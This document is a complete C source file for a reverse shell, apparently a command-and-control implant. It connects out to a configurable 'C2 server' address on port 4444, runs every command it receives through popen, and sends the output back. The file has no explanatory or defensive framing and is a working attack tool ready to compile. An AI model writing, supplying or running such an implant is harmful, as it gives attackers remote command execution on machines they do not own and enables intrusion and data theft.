#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"  // Change to your C2 server IP
#define SERVER_PORT 4444
#define BUFFER_SIZE 1024

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    char recv_buffer[BUFFER_SIZE];
    char send_buffer[BUFFER_SIZE];
    ssize_t bytes_received;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("Invalid address");
        close(sockfd);
        return 1;
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sockfd);
        return 1;
    }

    while (1) {
        bytes_received = recv(sockfd, recv_buffer, sizeof(recv_buffer) - 1, 0);
        if (bytes_received <= 0) {
            break; // Connection closed or error
        }
        recv_buffer[bytes_received] = '\0';

        // Execute the received command
        FILE *fp = popen(recv_buffer, "r");
        if (fp == NULL) {
            const char *err = "Failed to run command\n";
            send(sockfd, err, strlen(err), 0);
            continue;
        }

        // Read command output and send back
        while (fgets(send_buffer, sizeof(send_buffer), fp) != NULL) {
            send(sockfd, send_buffer, strlen(send_buffer), 0);
        }
        pclose(fp);
    }

    close(sockfd);
    return 0;
}
